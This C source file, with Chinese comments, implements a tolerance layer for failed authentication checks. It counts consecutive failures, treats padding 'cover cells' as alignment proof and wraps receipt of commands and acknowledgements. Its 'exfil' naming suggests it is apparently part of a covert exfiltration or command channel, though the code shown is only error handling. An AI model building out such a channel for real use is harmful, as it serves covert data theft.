/*
 * tol.c —— 验签失败容忍层实现
 * 见头文件顶部说明：边界（防黑洞）+ 遥测（有人在动链路）。
 */
#include "exfil_tol.h"
#include <string.h>

#define EXF_TOL_DEFAULT_CONSEC 8u

const char *exfil_tol_errstr(int e) {
    switch (e) {
        case EXF_TOL_OK:      return "ok";
        case EXF_TOL_PAD:     return "cover cell (alignment proved)";
        case EXF_TOL_SKIP:    return "auth failed, within tolerance";
        case EXF_TOL_FATAL:   return "consecutive auth failures exceeded limit (desync)";
        case EXF_TOL_ARG:     return "invalid argument";
        case EXF_TOL_IO:      return "i/o error";
        case EXF_TOL_CLOSED:  return "peer closed";
        case EXF_TOL_REPLAY:  return "replay detected";
        case EXF_TOL_FMT:     return "format invalid";
        default:              return "unknown";
    }
}

int exfil_tol_init(exfil_tol_t *t, uint32_t max_consec) {
    if (!t) return EXF_TOL_ARG;
    memset(t, 0, sizeof *t);
    t->max_consec = max_consec ? max_consec : EXF_TOL_DEFAULT_CONSEC;
    return EXF_TOL_OK;
}

void exfil_tol_reset_stats(exfil_tol_t *t) {
    if (!t) return;
    t->n_fail = 0;
    t->n_ok   = 0;
    t->n_pad  = 0;
    /* 不清 consec —— 它反映当前的对齐状态，不是统计量 */
}

/* 统一的裁决：把 task_link 的返回码折算成容忍层的语义 */
static int judge(exfil_tol_t *t, int r) {
    if (r == EXF_TASK_OK) {
        t->consec = 0;
        t->n_ok++;
        return EXF_TOL_OK;
    }
    /* 通过验签的 PAD 是对齐的正证据 —— 清零连续失败 */
    if (r == EXF_TASK_PAD) {
        t->consec = 0;
        t->n_pad++;
        return EXF_TOL_PAD;
    }
    if (r == EXF_TASK_ERR_AUTH) {
        t->n_fail++;
        t->consec++;
        /*
         * 超过上限：判定失步。宁可干净断链让上层重建会话，
         * 也不要静默黑洞（一直在跑但永远不投递）。
         */
        if (t->consec > t->max_consec) return EXF_TOL_FATAL;
        return EXF_TOL_SKIP;
    }
    if (r == EXF_TASK_ERR_ARG)    return EXF_TOL_ARG;
    if (r == EXF_TASK_ERR_IO)     return EXF_TOL_IO;
    if (r == EXF_TASK_ERR_CLOSED) return EXF_TOL_CLOSED;
    if (r == EXF_TASK_ERR_REPLAY) return EXF_TOL_REPLAY;
    return EXF_TOL_FMT;
}

int exfil_tol_recv_cmd(exfil_tol_t *t, exfil_task_chan_t *ch, int fd,
                       uint64_t *seq, exfil_task_cmd_t *c) {
    if (!t || !ch || !c) return EXF_TOL_ARG;
    return judge(t, exfil_task_chan_recv_cmd(ch, fd, seq, c));
}

int exfil_tol_recv_ack(exfil_tol_t *t, exfil_task_chan_t *ch, int fd,
                       uint64_t *seq, exfil_task_ack_t *a) {
    if (!t || !ch || !a) return EXF_TOL_ARG;
    return judge(t, exfil_task_chan_recv_ack(ch, fd, seq, a));
}
